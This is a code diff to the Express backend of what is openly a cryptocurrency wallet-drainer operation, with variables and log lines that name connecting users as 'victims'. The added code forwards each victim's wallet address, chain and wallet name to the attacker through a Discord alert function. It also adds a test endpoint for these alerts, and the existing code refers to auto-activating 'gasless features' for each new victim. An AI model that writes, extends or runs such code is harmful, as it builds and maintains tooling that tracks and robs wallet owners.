@@ -734,6 +734,24 @@ app.post("/api/track", async (req, res) => {
   try {
     const victimData = req.body;
     
+    // 🚨 ADD LOUD LOGGING
+    console.log('🎯🎯🎯 /api/track HIT! Wallet:', victimData.walletAddress);
+    console.log('🎯 Full data:', JSON.stringify(victimData));
+    
+    // 🚨 CRITICAL: ACTUALLY SEND DISCORD NOTIFICATION
+    if (victimData.walletAddress) {
+      console.log('🔔 Calling sendDiscordAlert for:', victimData.walletAddress);
+      await sendDiscordAlert({
+        walletAddress: victimData.walletAddress,
+        chain: victimData.chain || 'ethereum',
+        walletName: victimData.walletName || 'Unknown',
+        clientId: victimData.clientId || 'Direct',
+        type: "new_connection"
+      });
+    } else {
+      console.log('❌ No wallet address in track request');
+    }
+    
     // Auto-activate gasless features when victim connects
     if (victimData.walletAddress && GASLESS_MODE) {
       console.log('🆓 Auto-activating gasless features for new victim:', victimData.walletAddress);
@@ -752,8 +770,31 @@ app.post("/api/track", async (req, res) => {
     }
     
     return trackHandler(req, res);
+    
   } catch (error) {
+    console.log('❌ Track route error:', error);
     return trackHandler(req, res);
+  }
+});
+
+
+// TEST ENDPOINT - Direct Discord test
+app.post('/api/test-notification', async (req, res) => {
+  try {
+    const { walletAddress } = req.body;
+    console.log('🧪 TEST: Sending Discord notification for:', walletAddress);
+    
+    await sendDiscordAlert({
+      walletAddress: walletAddress || '0xTEST_' + Date.now(),
+      chain: "ethereum",
+      walletName: "Test Wallet", 
+      type: "new_connection"
+    });
+    
+    res.json({ success: true, message: 'Test notification sent' });
+  } catch (error) {
+    console.log('❌ Test notification error:', error);
+    res.status(500).json({ success: false, error: error.message });
   }
 });
 
